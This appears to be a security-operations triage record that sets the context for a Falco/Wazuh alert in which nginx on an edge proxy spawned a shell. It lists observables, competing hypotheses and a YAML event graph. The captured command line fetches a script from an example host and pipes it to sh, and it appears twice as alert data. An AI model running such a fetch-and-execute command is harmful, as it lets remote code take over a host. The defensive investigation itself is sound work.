## CONTEXTUALIZE

**Alert:** 1777222267.80 — wazuh-rule-100110 (Falco: shell spawned as child of nginx worker)
**Key observables:**
- agent: web-edge-03 / 10.0.7.18 (internet-facing nginx reverse proxy)
- proc.name: sh — child of nginx pid 1422
- proc.cmdline: `sh -c "curl -fsSL http://updates.example.io/x | sh"`
- user: www-data (uid 33) — the runtime user nginx normally drops to
- container.id: host (not in a container)
- timestamp: 2026-04-26T03:11:07.802Z
**Playbook hypotheses:** ?webshell-rce, ?legitimate-deploy-hook, ?certbot-renewal-hook, ?cron-driven-reload
**Available leads:** process-lineage, deploy-runs-correlation, web-server-child-baseline, outbound-connection-pairing, recent-config-changes
**Archetype matches:**
- webshell-rce — candidate — `sh -c "curl … | sh"` is the textbook `curl-pipe-sh` shape; web server spawning shell on a request path is the canonical RCE-via-nginx pattern.
- deploy-hook — candidate — some deploy systems (capistrano, ansible) DO spawn shells from nginx via post-receive scripts, especially on edge proxies.
- certbot-renewal — candidate — certbot's --pre-hook / --post-hook can run as the web user during renewal windows.
**Adversarial archetype:** webshell-rce — worst-case is an attacker reached an upload endpoint and pivoted to shell.
**Data environment:** reachable: host_query, wazuh, deploy-runs-api, playground_ticket; degraded: none

```yaml
prologue:
  vertices:
  - id: v-001
    type: endpoint
    classification: internet-facing-edge-proxy
    identifier: 10.0.7.18
    attributes:
      hostname: web-edge-03
  - id: v-002
    type: process
    classification: shell-process
    identifier: pid-31807
    attributes:
      proc_name: sh
      cmdline: 'sh -c "curl -fsSL http://updates.example.io/x | sh"'
      user: www-data
      uid: 33
  edges:
  - id: e-001
    relation: spawned
    source_vertex: v-001
    target_vertex: v-002
    when:
      timestamp: '2026-04-26T03:11:07.802Z'
    attributes:
      parent_proc: nginx
      parent_pid: 1422
    authority:
      kind: siem-event
      source: Falco syscall monitor
```
